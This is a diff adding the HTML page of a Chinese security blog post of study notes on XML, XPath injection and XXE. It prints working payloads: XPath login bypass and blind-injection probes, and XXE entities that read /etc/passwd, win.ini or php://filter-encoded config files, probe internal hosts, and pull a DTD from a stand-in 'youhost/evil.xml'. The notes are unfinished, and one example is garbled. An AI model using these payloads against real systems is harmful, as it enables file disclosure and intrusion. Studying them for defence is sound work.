@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>xxe的一些了解 | rhoeoeoeoeoeo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxe的一些了解">
+<meta property="og:url" content="http://example.com/2021/10/19/xxe%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="rhoeoeoeoeoeo">
+<meta property="og:description" content="-">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-10-19T12:16:16.071Z">
+<meta property="article:modified_time" content="2021-10-19T12:15:49.098Z">
+<meta property="article:author" content="rhoeo">
+<meta property="article:tag" content="xml">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="rhoeoeoeoeoeo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">rhoeoeoeoeoeo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-xxe攻击" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/10/19/xxe%E6%94%BB%E5%87%BB/" class="article-date">
+  <time class="dt-published" datetime="2021-10-19T12:16:16.071Z" itemprop="datePublished">2021-10-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      xxe的一些了解
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>-</p>
+<span id="more"></span>
+
+
+<h1 id="XML语言特点："><a href="#XML语言特点：" class="headerlink" title="XML语言特点："></a>XML语言特点：</h1><p>传输数据非显示数据<br>没有预定义标签</p>
+<h2 id="XML格式："><a href="#XML格式：" class="headerlink" title="XML格式："></a>XML格式：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;    //XML声明</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ELEMENT note (to,from,heading,bogy)&gt;</span><br><span class="line">    &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">    &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">    &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">    &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">                         //文档定义类型（DTD）</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;xx&lt;/to&gt;</span><br><span class="line">&lt;from&gt;xxx&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;x&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;xx&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line">                          //文档元素</span><br></pre></td></tr></table></figure>
+<h2 id="DTD："><a href="#DTD：" class="headerlink" title="DTD："></a>DTD：</h2><p>XML的格式规范（文档定义类型）<br>包括 XML声明，DTD文档类型定义，文档元素</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!-- ⬆XML声明⬆ --&gt;</span><br><span class="line">&lt;!DOCTYPE  文件名 [</span><br><span class="line">&lt;!ENTITY实体名 &quot;实体内容&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;!-- ⬆文档类型定义(DTD)⬆ --&gt;</span><br><span class="line">&lt;元素名称 category=&quot;属性&quot;&gt;</span><br><span class="line">文本或其他元素</span><br><span class="line">&lt;/元素名称&gt;</span><br><span class="line">&lt;!-- ⬆文档元素⬆ --&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="xml声明"><a href="#xml声明" class="headerlink" title="xml声明"></a>xml声明</h3><ol>
+<li>内部声明<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure></li>
+<li>外部引用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;或</span><br><span class="line">// system 标识符表示 该实体将从外部来源获取内容</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><ol>
+<li><p>内部实体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">例子</span><br><span class="line">&lt;!ENTITY writer &quot;me&quot;&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>外部实体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>ENTITY可以使用SYSTEM关键字调用外部资源，需要借助协议，如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file:///path/to/file.ext</span><br><span class="line">http://url/file.ext</span><br><span class="line">php://filter/read=convert.base64-encode/resource=conf.php</span><br><span class="line">php://filter/resource=c:/windows/win.ini</span><br></pre></td></tr></table></figure></li>
+<li><p>参数实体<br>仅能在DTD内部被引用，解析优先级高于xml内部实体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>实体调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&lt;/author&gt;</span><br><span class="line">注: 一个实体由三部分构成: (&amp;), 实体名称,  (;)</span><br></pre></td></tr></table></figure>
+<p>如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE n [</span><br><span class="line">  &lt;!ENTITY a SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;a;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。<br>CDATA 部分中的所有内容都会被解析器忽略。<br>CDATA 部分由 “<![CDATA[" 开始，由 "]]>“ 结束</p>
+<p>函数simplexml_load_string()可以读取XML<br>使用函数： simplexml_load_file() 把xml文档载入对象中</p>
+<h1 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h1><p>就是闭合标签<br>防御：过滤输入或进行转义</p>
+<h1 id="XPath-注入"><a href="#XPath-注入" class="headerlink" title="XPath 注入"></a>XPath 注入</h1><p>XPath 是 xml 路径语言，用于配置文件查找<br>利用 XPath扫描 和 XPath查询布尔化<br>攻击者可以控制用来进行XPath查询的XML数据库</p>
+<p>注入对象：存储数据的XML文件</p>
+<p>基本语法：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wendyw/p/11633588.html">https://www.cnblogs.com/wendyw/p/11633588.html</a></p>
+<p>原理代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正常查询：/root/users/user[username/text()=&#x27;test1&#x27;and password/text()=&#x27;test1&#x27;]</span><br><span class="line">在username中输入：&#x27; or 1=1 or &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="XPath-盲注"><a href="#XPath-盲注" class="headerlink" title="XPath 盲注"></a>XPath 盲注</h2><ol>
+<li>盲注根节点<br>判断数目：<br>?name=’ or count(/<em>) = 1 or ‘1’ = ‘2<br>猜解：<br>?name=’ or substring(name(/</em>[position() = 1]),1,1)=’r’ or ‘1’=’2</li>
+<li>依次下一节点<br>?name=’ or count(/root/*) = 1 or ‘1’ = ‘2<br>（类似于sql盲注，比sql注入更危险 范围更大 防护更低</li>
+</ol>
+<h1 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h1><p>发生于应用程序解析XML输入时，没有禁止外部实体加载<br>（由于解析xml在php库libxml  libxml&gt;=2.9.0版本中没有xxe漏洞）<br>引起任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等</p>
+<h2 id="利用（上传恶意xml文件）"><a href="#利用（上传恶意xml文件）" class="headerlink" title="利用（上传恶意xml文件）"></a>利用（上传恶意xml文件）</h2><ol>
+<li>任意文件读取<br>构造引入外部实体<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:///d://qwzf.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;file;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+使&file;变成外部文件qwzf.txt中内容</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file：//host/path</span><br><span class="line">* Linux</span><br><span class="line"> file:///etc/passwd</span><br><span class="line">*  Unix</span><br><span class="line"> file://localhost/etc/fstab</span><br><span class="line"> file:///localhost/etc/fstab</span><br><span class="line">*  Windows</span><br><span class="line"> file:///c:/windows/win.ini</span><br><span class="line"> file://localhost/c:/windows/win.ini</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>探测内网地址<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.100:80&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>将数据发送到远程服务器(攻击服务器)，观察服务器日志<br>（我尚未实现）</p>
+<h3 id="基于错误的xee"><a href="#基于错误的xee" class="headerlink" title="基于错误的xee"></a>基于错误的xee</h3><p>使服务器对我们人为的故意错误进行一些纠正 如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;！DOCTYPE Author[ \ n</span><br><span class="line">&lt;！ENTITY %% intentate_error_here“test”&gt;]&gt; \ n</span><br></pre></td></tr></table></figure>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
+<li>检测xml是否解析<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt; </span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">&lt;!ENTITY shit “this is shit”&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;root&gt;&amp;shit;&lt;/root&gt;</span><br></pre></td></tr></table></figure></li>
+<li>检测是否支持外部实体<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt; </span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">&lt;!ENTITY % shit SYSTEM “http://youhost/evil.xml”&gt;</span><br><span class="line">%shit; </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>使用开发语言提供的禁用外部实体的方法<br>过滤用户提交数据<br>不允许xml中含有自己定义的DTD</p>
+<p>还有一些比较细化的东西 比如浏览器的版本<br>还有一些类如ceye的网站怎么用，不看了 过几天再来看</p>
+<p>先占坑，未完待续</p>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/58915.html">https://www.secpulse.com/archives/58915.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9302528.html">https://www.cnblogs.com/backlion/p/9302528.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/10/19/xxe%E6%94%BB%E5%87%BB/" data-id="ckuy1wiyr00003cuw1xa050tg" data-title="xxe的一些了解" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xml/" rel="tag">xml</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/10/10/preg_replace%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">preg_replace代码执行</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/challenge/">challenge</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa/" rel="tag">dvwa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xml/" rel="tag">xml</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/dvwa/" style="font-size: 10px;">dvwa</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">php反序列化</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/xml/" style="font-size: 10px;">xml</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/10/19/xxe%E6%94%BB%E5%87%BB/">xxe的一些了解</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/10/preg_replace%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">preg_replace代码执行</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/03/rce/">rce的小整理</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/26/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化总结</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">文件包含漏洞总结</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 rhoeo<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
